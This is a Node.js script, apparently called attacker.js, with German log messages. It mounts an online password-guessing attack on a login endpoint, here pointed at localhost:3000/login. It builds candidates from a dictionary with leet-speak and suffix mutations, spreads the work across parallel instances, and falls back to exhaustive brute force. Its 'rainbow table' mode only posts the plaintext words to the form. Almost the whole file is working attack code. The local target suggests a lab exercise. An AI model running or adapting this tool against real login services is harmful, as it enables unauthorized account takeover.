const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const fetch = global.fetch || require('node-fetch');

const TARGET_URL = 'http://localhost:3000/login';
const DICT_PATH = path.resolve(__dirname, 'dictionary.txt');
const RAINBOW_TABLE_PATH = path.resolve(__dirname, 'rainbow_table.json');
const MAX_TRIES = 20000000;
let found = false;

const pLimit = (concurrency) => {
    const queue = [];
    let active = 0;
    const next = () => {
        if (queue.length === 0) return;
        if (active >= concurrency) return;
        active++;
        const {fn, resolve} = queue.shift();
        fn().then((r) => {
            active--;
            resolve(r);
            next();
        }, (e) => {
            active--;
            resolve(Promise.reject(e));
            next();
        });
    };
    return (fn) => new Promise((resolve) => {
        queue.push({fn, resolve});
        next();
    });
};

function generateHash(password, algorithm = 'sha256') {
    return crypto.createHash(algorithm).update(password).digest('hex');
}

function buildRainbowTable(wordlist, outputPath, algorithm = 'sha256') {
    console.log(`Erstelle Rainbow Table mit ${algorithm}...`);
    const table = {};
    let count = 0;

    for (const password of wordlist) {
        const hash = generateHash(password, algorithm);
        table[hash] = password;
        count++;
        if (count % 1000 === 0) {
            process.stdout.write(`\rGeneriert: ${count} Einträge`);
        }
    }

    console.log(`\n✓ Rainbow Table erstellt: ${count} Einträge`);
    fs.writeFileSync(outputPath, JSON.stringify(table, null, 2));
    console.log(`✓ Gespeichert: ${outputPath}`);
    return table;
}

function loadRainbowTable(filePath) {
    if (fs.existsSync(filePath)) {
        console.log(`Lade Rainbow Table von ${filePath}...`);
        const data = fs.readFileSync(filePath, 'utf8');
        const table = JSON.parse(data);
        console.log(`✓ Rainbow Table geladen: ${Object.keys(table).length} Einträge`);
        return table;
    }
    return null;
}

async function tryWithRainbowTable(username, rainbowTable) {
    console.log('\n=== RAINBOW TABLE ANGRIFF ===');
    const passwords = Object.values(rainbowTable);
    const limit = pLimit(10);
    for (const password of passwords) {
        if (found) break;
        await limit(() => tryCandidate(password, username));
    }
}

function splitWorkload(candidates, numInstances, instanceId) {
    const chunkSize = Math.ceil(candidates.length / numInstances);
    const start = instanceId * chunkSize;
    const end = Math.min(start + chunkSize, candidates.length);
    return candidates.slice(start, end);
}

function getInstanceConfig() {
    const instanceId = parseInt(process.env.INSTANCE_ID || process.argv[4] || '0');
    const totalInstances = parseInt(process.env.TOTAL_INSTANCES || process.argv[5] || '1');
    return { instanceId, totalInstances };
}

const USERNAME = process.argv[2];
const MODE = process.argv[3] || 'normal';

if (!USERNAME) {
    console.error('Usage: node attacker.js <username> [mode] [instanceId] [totalInstances]');
    console.error('Modes: normal, rainbow, parallel');
    console.error('Beispiel parallel: node attacker.js admin parallel 0 4');
    process.exit(1);
}

function safeMask(s) {
    if (!s) return '';
    return s.replace(/.(?=.{2})/g, '*');
}

const leetMap = {a: ['4', '@'], e: ['3'], i: ['1', '!'], o: ['0'], s: ['5', '$'], t: ['7']};

function leetVariants(word) {
    const res = new Set();
    function helper(idx, cur) {
        if (idx === word.length) {
            res.add(cur);
            return;
        }
        const ch = word[idx];
        helper(idx + 1, cur + ch);
        const low = ch.toLowerCase();
        if (leetMap[low]) {
            for (const sub of leetMap[low]) helper(idx + 1, cur + sub);
        }
    }
    helper(0, '');
    return Array.from(res);
}

function capsVariants(s) {
    return new Set([s, s.toLowerCase(), s.toUpperCase(), s[0].toUpperCase() + s.slice(1)]);
}

function buildBaseWords() {
    const words = new Set();
    if (fs.existsSync(DICT_PATH)) {
        const lines = fs.readFileSync(DICT_PATH, 'utf8').split(/\r?\n/).map(l => l.trim()).filter(Boolean);
        lines.forEach(w => words.add(w));
    }
    return Array.from(words);
}

function expandWithMutations(baseWords) {
    const out = new Set();
    const commonSuffixes = ['!', '1', '123', '2020', '2021', '2022', '2023', '2024', '#'];
    const specialInserts = ['!', '.', '_', '-', '@'];
    for (const w of baseWords) {
        for (const v of capsVariants(w)) {
            out.add(v);
            for (const s of commonSuffixes) out.add(v + s);
            for (const l of leetVariants(v)) out.add(l);
            out.add(v + '!');
            out.add('!' + v);
        }
        out.add(w + '123');
        out.add(w + '2023');
        for (const c of specialInserts) out.add(w + c);
    }
    const arr = Array.from(out);
    for (let i = 0; i < Math.min(200, arr.length); i++) {
        for (let j = 0; j < Math.min(200, arr.length); j++) {
            if (i === j) continue;
            out.add(arr[i] + arr[j]);
        }
    }
    return Array.from(out);
}

function* generateAndTest(charset, maxLen, startIdx = 0, skipCount = 1) {
    let currentIdx = 0;
    for (let len = 1; len <= maxLen; len++) {
        const indices = Array(len).fill(0);
        while (true) {
            if (currentIdx >= startIdx && (currentIdx - startIdx) % skipCount === 0) {
                yield indices.map(i => charset[i]).join('');
            }
            currentIdx++;
            let pos = len - 1;
            while (pos >= 0) {
                indices[pos]++;
                if (indices[pos] < charset.length) break;
                indices[pos] = 0;
                pos--;
            }
            if (pos < 0) break;
        }
    }
}

async function tryCandidate(candidate, username = USERNAME) {
    if (found) return false;
    const body = {username: username, password: candidate};
    try {
        const resp = await fetch(TARGET_URL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(body)
        });
        if (resp.status === 200) {
            console.log(`\n✓✓✓ FOUND password for ${username}: ${candidate}`);
            found = true;
            return true;
        } else {
            return false;
        }
    } catch (err) {
        console.error('Network error for candidate', safeMask(candidate), err.message);
        return false;
    }
}

(async () => {
    console.log(`\n=== PASSWORD TESTING TOOL ===`);
    console.log(`Target: ${TARGET_URL}`);
    console.log(`Username: ${USERNAME}`);
    console.log(`Mode: ${MODE}`);
    const { instanceId, totalInstances } = getInstanceConfig();
    if (MODE === 'parallel') {
        console.log(`Instance: ${instanceId + 1}/${totalInstances}`);
    }
    if (MODE === 'rainbow') {
        let rainbowTable = loadRainbowTable(RAINBOW_TABLE_PATH);
        if (!rainbowTable) {
            console.log('Keine Rainbow Table gefunden. Erstelle neue...');
            const base = buildBaseWords();
            const candidates = expandWithMutations(base);
            rainbowTable = buildRainbowTable(candidates, RAINBOW_TABLE_PATH);
        }
        await tryWithRainbowTable(USERNAME, rainbowTable);
        process.exit(found ? 0 : 1);
    }
    const base = buildBaseWords();
    console.log('Base words aus Dictionary:', base.slice(0, 10).join(', '));
    let candidates = expandWithMutations(base);
    console.log(`Generiert: ${candidates.length} Kandidaten`);
    const common = ['password', '123456', 'qwerty', 'letmein', 'welcome', 'admin', 'admin123'];
    candidates = candidates.concat(common);
    if (MODE === 'parallel' && totalInstances > 1) {
        candidates = splitWorkload(candidates, totalInstances, instanceId);
        console.log(`Diese Instanz verarbeitet: ${candidates.length} Kandidaten (${instanceId * 100 / totalInstances}% - ${(instanceId + 1) * 100 / totalInstances}%)`);
    }
    if (candidates.length > MAX_TRIES) candidates = candidates.slice(0, MAX_TRIES);
    const limit = pLimit(10);
    let tested = 0;
    for (const c of candidates) {
        if (found) break;
        await limit(() => tryCandidate(c));
        tested++;
        if (tested % 100 === 0) {
            process.stdout.write(`\rGetestet: ${tested}/${candidates.length}`);
        }
    }
    if (!found) {
        console.log('\n\nKein Match in Dictionary/Mutation-Phase.');
        console.log('Starte Brute-Force...');
        const charset = '0123456789abcdefghijklmnopqrstuvwxyz'.split('');
        const gen = generateAndTest(charset, 32, instanceId, totalInstances);
        let tries = 0;
        for (const candidate of gen) {
            if (found) break;
            tries++;
            if (tries % 1000 === 0) process.stdout.write(`\rBrute-Force: ${tries} versuche`);
            await limit(() => tryCandidate(candidate));
        }
    }
    console.log('\n\n=== FERTIG ===');
    if (!found) console.log('Passwort nicht gefunden (innerhalb der Limits).');
    process.exit(found ? 0 : 1);
})();